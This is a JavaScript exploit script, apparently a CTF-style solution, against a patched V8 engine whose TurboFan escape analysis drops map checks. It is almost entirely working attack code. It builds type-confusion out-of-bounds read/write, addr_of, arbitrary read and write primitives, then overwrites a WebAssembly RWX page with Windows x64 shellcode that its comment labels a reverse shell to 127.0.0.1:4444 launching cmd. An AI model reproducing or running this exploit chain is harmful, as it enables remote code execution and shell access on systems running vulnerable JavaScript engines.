// utils
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() { return '0x' + this.toString(16);};
BigInt.prototype.i2f = function() { int_view[0] = this; return float_view[0]; }
Number.prototype.hex = function() { return '0x' + this.toString(16); };
Number.prototype.f2i = function() { float_view[0] = this; return int_view[0]; }

// The patched v8 introduces a vulnerability reducing CheckMaps in TurboFan's Escape Analysis phase when JIT compiler runs
// My approach was to use it to create a type confusion vulnerability, overwriting a Uint8Array length property to get oob read/write
// variables
function opt_me(param) { param.target = 0x1337; };
let obj1 = {a:1,b:2,c:3,d:4,e:5,target:6};
let obj2 = new Uint8Array([0xde, 0xc0, 0x37, 0x13]);
let rw_helper = new Float64Array([1.1,1.1,1.1,1.1]);
let addr_of_helper = new Array({},2,3,4);
let rw_helper_offset = 0x144;
let addr_of_helper_offset = 0x190;

// compile opt_me
for (let i = 0; i < 100000; i++) opt_me(obj1);

// overwrite obj2 array length
opt_me(obj2);
console.log('[+] overwritten length:', obj2.length)

// leak base
let base = BigInt(obj2[48] + (obj2[49] << 8) + (obj2[50] << 16) + (obj2[51] << 24)) << 32n
console.log('[+] leaked base: ' + base.hex());

function little_endian_read(addr, start, count){ value = 0; for(index = 0; index < count; index++){ value += addr[start + index] << (8 * index); } return value; }
function addr_of(target_object) { addr_of_helper[0] = target_object; offset = little_endian_read(obj2, addr_of_helper_offset, 4); return base + BigInt(offset) - 1n; }
function leak(address, bytes=8) { address -= 8n; hi = Number(address >> 32n); lo = Number(address & 0xffffffffn) + 1; for(let i = 0; i < 4; i++) { bt = hi & 0xff; hi >>= 8; obj2[rw_helper_offset + i] = bt; bt = lo & 0xff; lo >>= 8; obj2[rw_helper_offset+4 + i] = bt; } mask = 0xFFFFFFFFFFFFFFFFn >> BigInt(64-8*bytes); return rw_helper[0].f2i() & mask; }
function write(address, value) { address -= 8n; hi = Number(address >> 32n); lo = Number(address & 0xffffffffn) + 1; for(let i = 0; i < 4; i++) { bt = hi & 0xff; hi >>= 8; obj2[rw_helper_offset + i] = bt; bt = lo & 0xff; lo >>= 8; obj2[rw_helper_offset+4 + i] = bt; } rw_helper[0] = value.i2f(); }

var wasm_code = new Uint8Array([ 0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x88, 0x80, 0x80, 0x80, 0x00, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a, 0x0b ]);

// reverse shell 127.0.0.1 4444
var shellcode = new Uint8Array([ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18, 0x0B, 0x02, 0x75, 0x72, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4F, 0xFF, 0xFF, 0xFF, 0x5D, 0x49, 0xBE, 0x77, 0x73, 0x32, 0x5F, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xE6, 0x48, 0x81, 0xEC, 0xA0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xE5, 0x49, 0xBC, 0x02, 0x00, 0x11, 0x5C, 0x7F, 0x00, 0x00, 0x01, 0x41, 0x54, 0x49, 0x89, 0xE4, 0x4C, 0x89, 0xF1, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x4C, 0x89, 0xEA, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xBA, 0x29, 0x80, 0x6B, 0x00, 0xFF, 0xD5, 0x50, 0x50, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0xC1, 0x41, 0xBA, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5, 0x48, 0x89, 0xC7, 0x6A, 0x10, 0x41, 0x58, 0x4C, 0x89, 0xE2, 0x48, 0x89, 0xF9, 0x41, 0xBA, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5, 0x48, 0x81, 0xC4, 0x40, 0x02, 0x00, 0x00, 0x41, 0xB8, 0x63, 0x6D, 0x64, 0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xE2, 0x57, 0x57, 0x57, 0x4D, 0x31, 0xC0, 0x6A, 0x0D, 0x59, 0x41, 0x50, 0xE2, 0xFC, 0x66, 0xC7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48, 0x8D, 0x44, 0x24, 0x18, 0xC6, 0x00, 0x68, 0x48, 0x89, 0xE6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xFF, 0xC0, 0x41, 0x50, 0x49, 0xFF, 0xC8, 0x4D, 0x89, 0xC1, 0x4C, 0x89, 0xC1, 0x41, 0xBA, 0x79, 0xCC, 0x3F, 0x86, 0xFF, 0xD5, 0x48, 0x31, 0xD2, 0x48, 0xFF, 0xCA, 0x8B, 0x0E, 0x41, 0xBA, 0x08, 0x87, 0x1D, 0x60, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5 ]);

var wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
var pwned = wasm_instance.exports.main;
var inst_addr = addr_of(wasm_instance);
console.log('[+] wasm instance addr:', inst_addr.hex())
var rwx_addr = leak(inst_addr + 0x68n, 8);
console.log('[+] rwx buffer:', rwx_addr.hex())

for (var i in shellcode) { write(rwx_addr + BigInt(i), BigInt(shellcode[i])) }

console.log('[+] pwn')
console.log(pwned());
readline()